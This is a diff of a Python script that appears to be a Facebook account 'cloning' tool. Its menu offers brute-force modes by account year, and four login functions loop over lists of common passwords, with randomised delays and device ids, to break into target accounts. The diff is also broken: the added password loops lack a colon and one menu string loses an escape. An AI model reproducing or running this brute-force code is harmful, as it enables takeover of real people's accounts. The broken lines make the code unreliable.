@@ -694,16 +694,16 @@ def main():
 def main():	    
     clear()
     print(
-        f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mBRUTE_CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2009-2010\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mBRUTE_CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/x1b[38;5;46m2009-2010\x1b[38;5;46m]\033[1;97m'
 	    )
     print(
-        f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2011-2012\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m\x1b[38;5;46m/\x1b[38;5;46m2011-2012\x1b[38;5;46m]\033[1;97m'
     )
     print(
-        f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2013-2015\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m\x1b[38;5;46m/\x1b[38;5;46m2013-2015\x1b[38;5;46m]\033[1;97m'
     )
     print(
-        f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m/\x1b[38;5;46m/\x1b[38;5;46m2017-2018\x1b[38;5;46m]\033[1;97m'
+        f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m\x1b[38;5;46m/\x1b[38;5;46m2017-2018\x1b[38;5;46m]\033[1;97m'
     )
     print(
         f'\x1b[38;5;46m[\033[1;97m5\x1b[38;5;46m] \033[1;97mEXIT PROGRAM\033[1;97m'
@@ -825,7 +825,7 @@ def login1(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))    
-        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -899,7 +899,7 @@ def login2(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -969,7 +969,7 @@ def login3(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -1040,7 +1040,7 @@ def login4(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
